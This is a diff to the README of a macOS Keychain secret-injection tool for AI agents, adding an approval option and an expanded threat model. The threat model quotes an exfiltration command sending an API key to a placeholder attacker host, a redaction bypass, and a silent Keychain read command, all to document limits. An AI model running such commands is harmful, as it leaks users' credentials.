@@ -82,7 +82,11 @@ An agent that is actively trying to get the value. See the limits below and the
 
 macOS Keychain only (no Linux or Windows backend), single user, no team
 sharing, audit log or rotation, and redaction is best-effort and line-based.
-It guards against accidental leaks into transcripts, not a hostile agent.
+It guards against accidental leaks into transcripts, not a hostile agent. An
+agent that can run shell commands as you can read any secret it can name,
+unless you store that secret with Keychain approval (see
+[Keychain approval](#keychain-approval)), and even then it can still get the
+value from a run you approve.
 
 ## How sealref fixes it
 
@@ -227,8 +231,30 @@ Values live in the Keychain: service `vaultlet:<group>`, account `<key>`. An
 index of group and key names (no values) is kept in `~/.vaultlet/index.json`,
 mode 0600. Writes pass the value to `security -i` on stdin, so it does not
 appear in `ps`. The management page binds to 127.0.0.1 only, rejects requests
-with a foreign `Host` or `Origin`, and its API never returns a value. Only
-`sealref run` reads values back.
+with a foreign `Host` or `Origin`, refuses to be framed, and its API never
+returns a value. Every API call needs a random token that is created at each
+launch and carried in the link sealref opens (`#t=...`), so other programs and
+other users on the Mac cannot use the API. Only `sealref run` reads values back.
+
+### Keychain approval
+
+When you save a secret, tick **Ask me in a macOS Keychain dialog every time
+this secret is read** to store it with an empty trusted-app list. Every read
+then raises a macOS dialog: sealref's own `sealref run`, and also an agent or
+any other process that calls `security find-generic-password` directly.
+Nothing can read it silently. The cost is a dialog on every `sealref run`
+(`run` waits up to 120 s for it).
+
+- The dialog names `security`, not the command. Because sealref and an
+  attacker both read through `security`, you cannot tell their reads apart.
+  Approve only when you just started a run that needs this key.
+- **Do not click "Always Allow".** It adds `/usr/bin/security` to the item's
+  trusted apps, and from then on anything running as you can read the item
+  silently.
+- An approved read still hands the value to the command the agent chose (see
+  [Threat model](#threat-model)).
+- Existing secrets keep their current setting. To protect one, save it again
+  from the page with the box ticked.
 
 ## Threat model
 
@@ -237,25 +263,43 @@ transcript, shell history, or log. It is not a sandbox against an agent that
 wants the value.
 
 - Anything running as your user can read the Keychain item with
-  `security find-generic-password -w`. sealref adds no barrier there.
+  `security find-generic-password -w`, silently, unless the secret was saved
+  with [Keychain approval](#keychain-approval). With approval, each read
+  raises a macOS dialog. Keychain ACLs cannot restrict access to sealref
+  alone: sealref reads through `/usr/bin/security`, so an agent using the
+  same binary looks identical.
 - The agent chooses the command that `sealref run` executes. A command such as
   `sh -c 'echo $API_KEY | rev'` defeats redaction, and
   `curl https://attacker.example -d "$API_KEY"` sends the value off-machine.
   Review what the agent runs, or gate `sealref run` behind your agent's
   permission prompts.
-- The child process can read its own environment, and so can anything else
-  running as you that can inspect it.
-- Redaction is line-based. A value split across lines, or in a stream that never
-  emits a newline, can pass through. Encodings other than raw, base64 and
-  URL-quoted are not caught.
-- Base64 detection covers the base64 of the value on its own. The value
-  base64-encoded together with other text, such as an HTTP Basic `user:key`
-  credential, is generally not caught.
+- The child process can read its own environment, and so can other processes
+  running as you while it runs. `ps eww <pid>` showed an injected test value
+  for a Homebrew `python3` child; Apple platform binaries hide their
+  environment. Keychain approval does not cover this window.
+- `--group` injects every key in the group, and the child also inherits your
+  whole environment. Prefer `--ref` for only the keys a command needs.
+- Redaction is line-based. A value split across lines can pass through.
+  (Output without a final newline, and very long lines, are still redacted.)
+- Redaction catches the raw value; its URL-quoted form; lower- and upper-case
+  hex; and its base64 and URL-safe base64, including when they are encoded
+  together with other text, such as an HTTP Basic `user:key` credential.
+  Anything else is not caught: reversed, partial, case-changed, hashed, or
+  otherwise transformed values.
 - Values shorter than 4 characters are not redacted (a warning is printed).
-- Values cannot contain newlines.
+- Values cannot contain control characters (newline, tab, ...) and are
+  limited to about 2900 bytes. Longer values would not stay inside one
+  `security -i` command line.
 - `request_secret` shows the agent-supplied `reason` text on the page. It is
   escaped, but a misleading reason can still talk you into entering a secret
-  you should not. Read it.
+  you should not. Read it. The agent picks the group and key too, so it can
+  ask for credentials the task does not need.
+- `has_secret` and `request_secret` trust the name index, not the Keychain.
+  A key that was deleted by hand still counts as present.
+- The access token for the local page is printed to stderr (which an MCP
+  client may log) and is briefly visible in the browser-launcher's argv.
+- The MCP server's `mcp==1.29.0` pin covers only that package. Its
+  dependencies resolve at launch and are not hash-locked.
 - macOS only. There is no Linux or Windows backend.
 
 See [SECURITY-REVIEW.md](SECURITY-REVIEW.md) for the review notes.
